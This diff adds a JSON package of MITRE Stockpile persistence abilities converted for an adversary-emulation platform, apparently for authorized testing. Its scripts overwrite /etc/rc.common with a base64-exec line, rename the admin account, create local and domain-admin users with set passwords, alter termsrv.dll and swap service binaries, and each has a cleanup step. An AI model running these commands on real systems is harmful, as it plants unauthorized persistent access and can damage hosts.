@@ -1,0 +1,336 @@
+{
+  "package_id": "stockpile-persist-v1",
+  "package_name": "STOCKPILE - Persistence Pack (MITRE)",
+  "version": "1.0.0",
+  "description": "MITRE CALDERA Stockpile command-based abilities converted to Morgana-native scripts for Persistence (TA0003). CALDERA is not required at runtime.",
+  "author": "MITRE (converted by X3M.AI for Morgana)",
+  "created": "2026-04-30",
+  "source": "mitre-stockpile",
+  "source_repository": "https://github.com/mitre/stockpile",
+  "source_commit": "996ec41cd1c5d1c7cc09e620fc55dabe5aefd9cc",
+  "mitre_domain": "enterprise-attack",
+  "mitre_tactic": "Persistence (TA0003)",
+  "mitre_tactic_name": "Persistence",
+  "mitre_tactic_source": "persistence",
+  "mitre_tcodes": [
+    "T1037.004",
+    "T1098",
+    "T1136.001",
+    "T1136.002",
+    "T1505.005",
+    "T1543.003"
+  ],
+  "platform": [
+    "linux",
+    "macos",
+    "windows"
+  ],
+  "prerequisites": [
+    "Morgana agent installed on the authorized target",
+    "Required Stockpile facts supplied as Morgana tag values",
+    "CALDERA and Stockpile are not required at runtime"
+  ],
+  "license": "Apache-2.0",
+  "tag_categories": [
+    {
+      "category_id": "stockpile_persist_1543_003",
+      "label": "T1543.003 Stockpile Parameters",
+      "description": "Input parameters for MITRE Stockpile T1543.003 abilities.",
+      "scope": "local",
+      "used_by_tcodes": [
+        "T1543.003"
+      ],
+      "tags": [
+        {
+          "key": "stockpile_persist_1543_003_host_service_modifiable",
+          "label": "Host Service Modifiable",
+          "description": "MITRE Stockpile fact: host.service.modifiable",
+          "default": "",
+          "example": "",
+          "sensitive": false,
+          "required": true
+        }
+      ]
+    }
+  ],
+  "scripts": [
+    {
+      "id": "STOCKPILE - T1037.004 - Logon Initialization Scripts (RC Scripts) (Generated from Atomic Red Team) [Linux/Bash]",
+      "name": "STOCKPILE - T1037.004 - Logon Initialization Scripts (RC Scripts) (Generated from Atomic Red Team) [Linux/Bash]",
+      "description": "Ability for Boot or Logon Initialization Scripts: RC Scripts (ATT&CK T1037.004).\nModifies rc.common\nGenerated from Atomic Red Team procedures (c33f3d80-5f04-419b-a13a-854d1cbdbf3a); review and test safely before use.",
+      "tactic": "Persistence",
+      "tcode": "T1037.004",
+      "technique_name": "Boot or Logon Initialization Scripts: RC Scripts",
+      "executor": "bash",
+      "platform": "linux",
+      "required_tags": [],
+      "command": "filename='/etc/rc.common';\nif [ ! -f $filename ]; then \n  sudo touch $filename;\nelse \n  sudo cp $filename /etc/rc.common.original;\nfi;\nprintf '%s\\n' '#!/bin/bash' | sudo tee /etc/rc.common;\necho \"python3 -c \\\"import os, base64;exec(base64.b64decode('aW1wb3J0IG9zCm9zLnBvcGVuKCdlY2hvIGF0b21pYyB0ZXN0IGZvciBtb2RpZnlpbmcgcmMuY29tbW9uID4gL3RtcC9UMTAzNy4wMDQucmMuY29tbW9uJykK'))\\\"\" | sudo tee -a /etc/rc.common;\nprintf '%s\\n' 'exit 0' | sudo tee -a /etc/rc.common;\nsudo chmod +x /etc/rc.common;",
+      "cleanup_command": "origfilename='/etc/rc.common.original';\nif [ ! -f $origfilename ]; then \n  sudo rm /etc/rc.common;\nelse \n  sudo cp $origfilename /etc/rc.common && sudo rm $origfilename;\nfi",
+      "detection_rule": "See MITRE ATT&CK for detection guidance",
+      "sentinel_connector": "",
+      "package": "stockpile",
+      "source": "mitre-stockpile",
+      "stockpile_id": "624711ce-73bb-4bb5-9808-32471a8de5b0",
+      "source_path": "data/abilities/persistence/624711ce-73bb-4bb5-9808-32471a8de5b0.yml",
+      "source_executor": "sh",
+      "source_platform": "linux"
+    },
+    {
+      "id": "STOCKPILE - T1098 - Manipulate Admin Account Name (Generated from Atomic Red Team) [Windows/PowerShell]",
+      "name": "STOCKPILE - T1098 - Manipulate Admin Account Name (Generated from Atomic Red Team) [Windows/PowerShell]",
+      "description": "Ability for Account Manipulation (ATT&CK T1098).\nChanges Admin Account Name\nGenerated from Atomic Red Team procedures (5598f7cb-cf43-455e-883a-f6008c5d46af); review and test safely before use.",
+      "tactic": "Persistence",
+      "tcode": "T1098",
+      "technique_name": "Account Manipulation",
+      "executor": "powershell",
+      "platform": "windows",
+      "required_tags": [],
+      "command": "$x = Get-Random -Minimum 2 -Maximum 9999;\n$y = Get-Random -Minimum 2 -Maximum 9999;\n$z = Get-Random -Minimum 2 -Maximum 9999;\n$w = Get-Random -Minimum 2 -Maximum 9999;\nWrite-Host HaHa_$x$y$z;\n$fmm = Get-LocalGroupMember -Group Administrators |?{ $_.ObjectClass -match \"User\" -and $_.PrincipalSource -match \"Local\"} | Select Name;\nforeach($member in $fmm) {\n  if($member -like \"*Administrator*\") {\n    $account = $member.Name.Split(\"\\\")[-1];\n    $originalDescription = (Get-LocalUser -Name $account).Description;\n    Set-LocalUser -Name $account -Description \"atr:$account;$originalDescription\".Substring(0,48);\n    Rename-LocalUser -Name $account -NewName \"HaHa_$x$y$z\";\n    Write-Host \"Successfully Renamed $account Account on \" $Env:COMPUTERNAME;\n  }\n}",
+      "cleanup_command": "$list = Get-LocalUser |?{$_.Description -like \"atr:*\"};\nforeach($u in $list) {\n  $u.Description -match \"atr:(?<Name>[^;]+);(?<Description>.*)\";\n  Set-LocalUser -Name $u.Name -Description $Matches.Description;\n  Rename-LocalUser -Name $u.Name -NewName $Matches.Name;\n  Write-Host \"Successfully Reverted Account $($u.Name) to $($Matches.Name) on \" $Env:COMPUTERNAME;\n}",
+      "detection_rule": "See MITRE ATT&CK for detection guidance",
+      "sentinel_connector": "",
+      "package": "stockpile",
+      "source": "mitre-stockpile",
+      "stockpile_id": "4c9f1a19-3126-4bf5-8224-a2ace3f31755",
+      "source_path": "data/abilities/persistence/4c9f1a19-3126-4bf5-8224-a2ace3f31755.yml",
+      "source_executor": "psh",
+      "source_platform": "windows"
+    },
+    {
+      "id": "STOCKPILE - T1136.001 - Create A New Local User Account (Generated from Atomic Red Team) [Linux/Bash]",
+      "name": "STOCKPILE - T1136.001 - Create A New Local User Account (Generated from Atomic Red Team) [Linux/Bash]",
+      "description": "Ability for Create Account: Local Account (ATT&CK T1136.001). \nCreates a new local user.\nGenerated from Atomic Red Team procedures (6657864e-0323-4206-9344-ac9cd7265a4f; 40d8eabd-e394-46f6-8785-b9bfa1d011d2; 01993ba5-1da3-4e15-a719-b690d4f0f0b2); review and test safely before use.",
+      "tactic": "Persistence",
+      "tcode": "T1136.001",
+      "technique_name": "Create Account: Local Account",
+      "executor": "bash",
+      "platform": "linux",
+      "required_tags": [],
+      "command": "useradd -M -N -r -s /bin/bash -c evil_account T1136001user",
+      "cleanup_command": "userdel T1136001user",
+      "detection_rule": "See MITRE ATT&CK for detection guidance",
+      "sentinel_connector": "",
+      "package": "stockpile",
+      "source": "mitre-stockpile",
+      "stockpile_id": "4d925c07-2193-44da-be23-9fbc79e3a76e",
+      "source_path": "data/abilities/persistence/4d925c07-2193-44da-be23-9fbc79e3a76e.yml",
+      "source_executor": "sh",
+      "source_platform": "linux"
+    },
+    {
+      "id": "STOCKPILE - T1136.001 - Create A New Local User Account (Generated from Atomic Red Team) [Windows/CMD]",
+      "name": "STOCKPILE - T1136.001 - Create A New Local User Account (Generated from Atomic Red Team) [Windows/CMD]",
+      "description": "Ability for Create Account: Local Account (ATT&CK T1136.001). \nCreates a new local user.\nGenerated from Atomic Red Team procedures (6657864e-0323-4206-9344-ac9cd7265a4f; 40d8eabd-e394-46f6-8785-b9bfa1d011d2; 01993ba5-1da3-4e15-a719-b690d4f0f0b2); review and test safely before use.",
+      "tactic": "Persistence",
+      "tcode": "T1136.001",
+      "technique_name": "Create Account: Local Account",
+      "executor": "cmd",
+      "platform": "windows",
+      "required_tags": [],
+      "command": "net user /add \"T1136001CMD\" \"T1136001_CMD!\"",
+      "cleanup_command": "net user \"T1136001CMD\" /del",
+      "detection_rule": "See MITRE ATT&CK for detection guidance",
+      "sentinel_connector": "",
+      "package": "stockpile",
+      "source": "mitre-stockpile",
+      "stockpile_id": "4d925c07-2193-44da-be23-9fbc79e3a76e",
+      "source_path": "data/abilities/persistence/4d925c07-2193-44da-be23-9fbc79e3a76e.yml",
+      "source_executor": "cmd",
+      "source_platform": "windows"
+    },
+    {
+      "id": "STOCKPILE - T1136.001 - Create A New Local User Account (Generated from Atomic Red Team) [macOS/Bash]",
+      "name": "STOCKPILE - T1136.001 - Create A New Local User Account (Generated from Atomic Red Team) [macOS/Bash]",
+      "description": "Ability for Create Account: Local Account (ATT&CK T1136.001). \nCreates a new local user.\nGenerated from Atomic Red Team procedures (6657864e-0323-4206-9344-ac9cd7265a4f; 40d8eabd-e394-46f6-8785-b9bfa1d011d2; 01993ba5-1da3-4e15-a719-b690d4f0f0b2); review and test safely before use.",
+      "tactic": "Persistence",
+      "tcode": "T1136.001",
+      "technique_name": "Create Account: Local Account",
+      "executor": "bash",
+      "platform": "macos",
+      "required_tags": [],
+      "command": "dscl . -create /Users/T1136001user;\ndscl . -create /Users/T1136001user UserShell /bin/zsh;\ndscl . -create /Users/T1136001user RealName \"T1136.001 User\";\ndscl . -create /Users/T1136001user UniqueID \"1010\";\ndscl . -create /Users/T1136001user PrimaryGroupID 80;\ndscl . -create /Users/T1136001user NFSHomeDirectory /Users/T1136001user",
+      "cleanup_command": "dscl . -delete /Users/T1136001user",
+      "detection_rule": "See MITRE ATT&CK for detection guidance",
+      "sentinel_connector": "",
+      "package": "stockpile",
+      "source": "mitre-stockpile",
+      "stockpile_id": "4d925c07-2193-44da-be23-9fbc79e3a76e",
+      "source_path": "data/abilities/persistence/4d925c07-2193-44da-be23-9fbc79e3a76e.yml",
+      "source_executor": "sh",
+      "source_platform": "darwin"
+    },
+    {
+      "id": "STOCKPILE - T1136.002 - Create a new Windows domain admin user (Generated from Atomic Red Team) [Windows/PowerShell]",
+      "name": "STOCKPILE - T1136.002 - Create a new Windows domain admin user (Generated from Atomic Red Team) [Windows/PowerShell]",
+      "description": "Ability for Create Account: Domain Account (ATT&CK T1136.002). \nCreates a new domain admin user. Requires agent to be running as a domain admin.\nGenerated from Atomic Red Team procedures (fcec2963-9951-4173-9bfa-98d8b7834e62); review and test safely before use.",
+      "tactic": "Persistence",
+      "tcode": "T1136.002",
+      "technique_name": "Create Account: Domain Account",
+      "executor": "powershell",
+      "platform": "windows",
+      "required_tags": [],
+      "command": "net user \"T1136002Admin\" \"T1136_pass123!\" /add /domain;\nnet group \"Domain Admins\" \"T1136002Admin\" /add /domain",
+      "cleanup_command": "net user \"T1136002Admin\" /del /domain",
+      "detection_rule": "See MITRE ATT&CK for detection guidance",
+      "sentinel_connector": "",
+      "package": "stockpile",
+      "source": "mitre-stockpile",
+      "stockpile_id": "a9c9ba42-0627-40dc-a549-ca0a4e2ad004",
+      "source_path": "data/abilities/persistence/a9c9ba42-0627-40dc-a549-ca0a4e2ad004.yml",
+      "source_executor": "psh",
+      "source_platform": "windows"
+    },
+    {
+      "id": "STOCKPILE - T1505.005 - Simulate Patching termsrv.dll (Generated from Atomic Red Team) [Windows/PowerShell]",
+      "name": "STOCKPILE - T1505.005 - Simulate Patching termsrv.dll (Generated from Atomic Red Team) [Windows/PowerShell]",
+      "description": "Ability for Server Software Component: Terminal Services DLL (ATT&CK T1505.005).\nSimulates patching of termsrv.dll by making a benign change to the file and replacing it with the original afterwards.\nGenerated from Atomic Red Team procedures (0b2eadeb-4a64-4449-9d43-3d999f4a317b); review and test safely before use.",
+      "tactic": "Persistence",
+      "tcode": "T1505.005",
+      "technique_name": "Server Software Component: Terminal Services DLL",
+      "executor": "powershell",
+      "platform": "windows",
+      "required_tags": [],
+      "command": "$termsrvDll = \"C:\\Windows\\System32\\termsrv.dll\";\n$ACL = Get-Acl $termsrvDll;\n$permission = \"Administrators\",\"FullControl\",\"Allow\";\n$accessRule = New-Object System.Security.AccessControl.FileSystemAccessRule $permission;\n$ACL.SetAccessRule($accessRule);\nSet-Acl -Path $termsrvDll -AclObject $ACL;\nCopy-Item -Path \"C:\\Windows\\System32\\termsrv.dll\" -Destination \"C:\\Windows\\System32\\termsrv_backup.dll\" -ErrorAction Ignore;\nAdd-Content -Path \"C:\\Windows\\System32\\termsrv.dll\" -Value \"`n\" -NoNewline -ErrorAction Ignore;",
+      "cleanup_command": "Move-Item -Path \"C:\\Windows\\System32\\termsrv_backup.dll\" -Destination \"C:\\Windows\\System32\\termsrv.dll\" -Force -ErrorAction Ignore",
+      "detection_rule": "See MITRE ATT&CK for detection guidance",
+      "sentinel_connector": "",
+      "package": "stockpile",
+      "source": "mitre-stockpile",
+      "stockpile_id": "40ce2b51-9b25-4b34-9c22-c9e3abd85344",
+      "source_path": "data/abilities/persistence/40ce2b51-9b25-4b34-9c22-c9e3abd85344.yml",
+      "source_executor": "psh",
+      "source_platform": "windows"
+    },
+    {
+      "id": "STOCKPILE - T1543.003 - Replace a service binary with alternate binary [Windows/PowerShell]",
+      "name": "STOCKPILE - T1543.003 - Replace a service binary with alternate binary [Windows/PowerShell]",
+      "description": "This is an example technique. snmptrap.exe should be changed in the command\nbelow with the new desired service binary. Depending on the value of\nhost.service.modifiable this ability can damage the target system.",
+      "tactic": "Persistence",
+      "tcode": "T1543.003",
+      "technique_name": "Create or Modify System Process: Windows Service",
+      "executor": "powershell",
+      "platform": "windows",
+      "required_tags": [
+        "stockpile_persist_1543_003_host_service_modifiable"
+      ],
+      "command": "$s = Get-Service -Name #{stockpile_persist_1543_003_host_service_modifiable};\nif ($s.status -ne 'Stopped') { Stop-Service $s };\n$exe = (Get-ItemProperty -Path \"HKLM:\\System\\CurrentControlSet\\Services\\#{stockpile_persist_1543_003_host_service_modifiable}\").ImagePath.split()[0];\n$path = (Resolve-Path $exe).Path;\nCopy-Item -Path $path -Destination ($path + \".saved\");\nCopy-Item -Path \"C:\\Windows\\System32\\snmptrap.exe\" -Destination $path",
+      "cleanup_command": "$exe = (Get-ItemProperty -Path \"HKLM:\\System\\CurrentControlSet\\Services\\#{stockpile_persist_1543_003_host_service_modifiable}\").ImagePath.split()[0];\n$path = (Resolve-Path $exe).Path;\nIf (Test-Path ($path + \".saved\")) {\n  Remove-Item $path;\n  Move-Item -Path ($path + \".saved\") -Destination $path\n}",
+      "detection_rule": "See MITRE ATT&CK for detection guidance",
+      "sentinel_connector": "",
+      "package": "stockpile",
+      "source": "mitre-stockpile",
+      "stockpile_id": "52771610-2322-44cf-816b-a7df42b4c086",
+      "source_path": "data/abilities/persistence/52771610-2322-44cf-816b-a7df42b4c086.yml",
+      "source_executor": "psh",
+      "source_platform": "windows",
+      "source_requirements": [
+        {
+          "plugins.stockpile.app.requirements.paw_provenance": [
+            {
+              "source": "host.service.modifiable"
+            }
+          ]
+        }
+      ]
+    }
+  ],
+  "chains": [
+    {
+      "name": "STOCKPILE - T1037.004 - Logon Initialization Scripts (RC Scripts) (Generated from Atomic Red Team) [Linux/Bash]",
+      "description": "Single-step MITRE Stockpile chain for T1037.004 - Boot or Logon Initialization Scripts: RC Scripts.",
+      "package": "stockpile-persist-v1",
+      "tcode": "T1037.004",
+      "tactic": "Persistence",
+      "script_refs": [
+        "STOCKPILE - T1037.004 - Logon Initialization Scripts (RC Scripts) (Generated from Atomic Red Team) [Linux/Bash]"
+      ]
+    },
+    {
+      "name": "STOCKPILE - T1098 - Manipulate Admin Account Name (Generated from Atomic Red Team) [Windows/PowerShell]",
+      "description": "Single-step MITRE Stockpile chain for T1098 - Account Manipulation.",
+      "package": "stockpile-persist-v1",
+      "tcode": "T1098",
+      "tactic": "Persistence",
+      "script_refs": [
+        "STOCKPILE - T1098 - Manipulate Admin Account Name (Generated from Atomic Red Team) [Windows/PowerShell]"
+      ]
+    },
+    {
+      "name": "STOCKPILE - T1136.001 - Create A New Local User Account (Generated from Atomic Red Team) [Linux/Bash]",
+      "description": "Single-step MITRE Stockpile chain for T1136.001 - Create Account: Local Account.",
+      "package": "stockpile-persist-v1",
+      "tcode": "T1136.001",
+      "tactic": "Persistence",
+      "script_refs": [
+        "STOCKPILE - T1136.001 - Create A New Local User Account (Generated from Atomic Red Team) [Linux/Bash]"
+      ]
+    },
+    {
+      "name": "STOCKPILE - T1136.001 - Create A New Local User Account (Generated from Atomic Red Team) [Windows/CMD]",
+      "description": "Single-step MITRE Stockpile chain for T1136.001 - Create Account: Local Account.",
+      "package": "stockpile-persist-v1",
+      "tcode": "T1136.001",
+      "tactic": "Persistence",
+      "script_refs": [
+        "STOCKPILE - T1136.001 - Create A New Local User Account (Generated from Atomic Red Team) [Windows/CMD]"
+      ]
+    },
+    {
+      "name": "STOCKPILE - T1136.001 - Create A New Local User Account (Generated from Atomic Red Team) [macOS/Bash]",
+      "description": "Single-step MITRE Stockpile chain for T1136.001 - Create Account: Local Account.",
+      "package": "stockpile-persist-v1",
+      "tcode": "T1136.001",
+      "tactic": "Persistence",
+      "script_refs": [
+        "STOCKPILE - T1136.001 - Create A New Local User Account (Generated from Atomic Red Team) [macOS/Bash]"
+      ]
+    },
+    {
+      "name": "STOCKPILE - T1136.002 - Create a new Windows domain admin user (Generated from Atomic Red Team) [Windows/PowerShell]",
+      "description": "Single-step MITRE Stockpile chain for T1136.002 - Create Account: Domain Account.",
+      "package": "stockpile-persist-v1",
+      "tcode": "T1136.002",
+      "tactic": "Persistence",
+      "script_refs": [
+        "STOCKPILE - T1136.002 - Create a new Windows domain admin user (Generated from Atomic Red Team) [Windows/PowerShell]"
+      ]
+    },
+    {
+      "name": "STOCKPILE - T1505.005 - Simulate Patching termsrv.dll (Generated from Atomic Red Team) [Windows/PowerShell]",
+      "description": "Single-step MITRE Stockpile chain for T1505.005 - Server Software Component: Terminal Services DLL.",
+      "package": "stockpile-persist-v1",
+      "tcode": "T1505.005",
+      "tactic": "Persistence",
+      "script_refs": [
+        "STOCKPILE - T1505.005 - Simulate Patching termsrv.dll (Generated from Atomic Red Team) [Windows/PowerShell]"
+      ]
+    },
+    {
+      "name": "STOCKPILE - T1543.003 - Replace a service binary with alternate binary [Windows/PowerShell]",
+      "description": "Single-step MITRE Stockpile chain for T1543.003 - Create or Modify System Process: Windows Service.",
+      "package": "stockpile-persist-v1",
+      "tcode": "T1543.003",
+      "tactic": "Persistence",
+      "script_refs": [
+        "STOCKPILE - T1543.003 - Replace a service binary with alternate binary [Windows/PowerShell]"
+      ]
+    },
+    {
+      "name": "STOCKPILE - Persistence - Full Tactic Convenience Chain",
+      "description": "Convenience collection of all 8 converted Persistence scripts. This is not an authentic MITRE CALDERA adversary profile or validated operation sequence.",
+      "package": "stockpile-persist-v1",
+      "tcode": "T1037.004",
+      "tactic": "Persistence",
+      "script_refs": [
+        "STOCKPILE - T1037.004 - Logon Initialization Scripts (RC Scripts) (Generated from Atomic Red Team) [Linux/Bash]",
+        "STOCKPILE - T1098 - Manipulate Admin Account Name (Generated from Atomic Red Team) [Windows/PowerShell]",
+        "STOCKPILE - T1136.001 - Create A New Local User Account (Generated from Atomic Red Team) [Linux/Bash]",
+        "STOCKPILE - T1136.001 - Create A New Local User Account (Generated from Atomic Red Team) [Windows/CMD]",
+        "STOCKPILE - T1136.001 - Create A New Local User Account (Generated from Atomic Red Team) [macOS/Bash]",
+        "STOCKPILE - T1136.002 - Create a new Windows domain admin user (Generated from Atomic Red Team) [Windows/PowerShell]",
+        "STOCKPILE - T1505.005 - Simulate Patching termsrv.dll (Generated from Atomic Red Team) [Windows/PowerShell]",
+        "STOCKPILE - T1543.003 - Replace a service binary with alternate binary [Windows/PowerShell]"
+      ]
+    }
+  ]
+}
